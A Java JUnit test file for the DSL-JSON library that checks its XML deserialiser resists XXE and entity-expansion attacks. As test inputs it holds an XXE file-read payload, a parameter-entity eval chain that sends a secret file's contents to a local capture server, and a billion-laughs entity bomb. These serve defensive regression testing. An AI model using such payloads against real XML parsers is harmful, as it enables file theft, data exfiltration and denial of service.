package com.dslplatform.json;

import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.w3c.dom.Element;

import com.sun.net.httpserver.HttpServer;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class XmlSecurityTest {

	private static final String SECRET = "dsl-json-xxe-secret-42";

	private DslJson<Object> json;
	private Path secretFile;
	private HttpServer captureServer;
	private List<String> capturedRequests;

	@Before
	public void setUp() throws IOException {
		json = new DslJson<>(new DslJson.Settings<>().withJavaConverters(true));
		secretFile = Files.createTempFile("dsl-json-xxe", ".txt");
		Files.write(secretFile, SECRET.getBytes(StandardCharsets.UTF_8));
		capturedRequests = new CopyOnWriteArrayList<String>();
		captureServer = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
		captureServer.createContext("/", exchange -> {
			capturedRequests.add(exchange.getRequestURI().toString());
			byte[] response = "ok".getBytes(StandardCharsets.UTF_8);
			exchange.sendResponseHeaders(200, response.length);
			exchange.getResponseBody().write(response);
			exchange.close();
		});
		captureServer.start();
	}

	@After
	public void tearDown() throws IOException {
		captureServer.stop(0);
		Files.deleteIfExists(secretFile);
	}

	private static byte[] jsonXml(final String xml) {
		final String escaped = xml.replace("\\", "\\\\").replace("\"", "\\\"");
		return ("\"" + escaped + "\"").getBytes(StandardCharsets.UTF_8);
	}

	@Test
	public void xxeFileRead() throws IOException {
		final String xml = "<?xml version=\"1.0\"?>"
				+ "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://" + secretFile.toUri().getPath() + "\">]>"
				+ "<foo>&xxe;</foo>";
		assertXmlWithDtdDoesNotWork(xml);
	}

	@Test
	public void xxeParameterEntity() throws IOException {
		final String xml = "<?xml version=\"1.0\"?>"
				+ "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"http://127.0.0.1:" + captureServer.getAddress().getPort() + "/?d=xxe\">%file;]>"
				+ "<foo/>";
		final byte[] body = jsonXml(xml);
		Element el = json.deserialize(Element.class, body, body.length);
		Assert.assertNotNull(el);
		Assert.assertTrue(
				"Parser made an outbound request while resolving a parameter entity: " + capturedRequests,
				capturedRequests.isEmpty());
	}

	@Test
	public void xxeEvalInjectionIsRejected() throws IOException {
		final String xml = "<?xml version=\"1.0\"?>"
				+ "<!DOCTYPE foo ["
				+ "<!ENTITY % file SYSTEM \"file://" + secretFile.toUri().getPath() + "\">"
				+ "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:" + captureServer.getAddress().getPort() + "/?d=%file;'>\">"
				+ "%eval;"
				+ "%exfil;"
				+ "]><foo/>";
		try {
			assertXmlWithDtdDoesNotWork(xml);
			Assert.fail("Expecting error");
		} catch (ParsingException ex) {
			Assert.assertTrue(ex.getMessage().contains("The parameter entity reference \"%file;\" cannot occur within markup in the internal subset of the DTD. Invalid XML value at position:"));
		}
	}

	@Test
	public void billionLaughsAttack() throws IOException {
		final String xml = "<?xml version=\"1.0\"?>"
				+ "<!DOCTYPE lolz ["
				+ "<!ENTITY lol \"lol\">"
				+ "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
				+ "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
				+ "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">"
				+ "]><lolz>&lol4;</lolz>";
		assertXmlWithDtdDoesNotWork(xml);
	}

	private void assertXmlWithDtdDoesNotWork(final String xml) throws IOException {
		final byte[] body = jsonXml(xml);
		final Element element = json.deserialize(Element.class, body, body.length);
		Assert.assertFalse("XXE payload leaked file content: " + serialize(element), serialize(element).contains(SECRET));
	}

	private String serialize(final Element element) throws IOException {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		json.serialize(element, out);
		return out.toString("UTF-8");
	}

	@Test
	public void plainXmlStillRoundTrips() throws IOException {
		final String xml = "<root attr=\"v\"><child>text &amp; more</child></root>";
		final byte[] body = jsonXml(xml);
			final Element element = json.deserialize(Element.class, body, body.length);
		Assert.assertEquals("root", element.getNodeName());
		Assert.assertTrue(serialize(element).contains("<child>text &amp; more</child>"));
	}
}
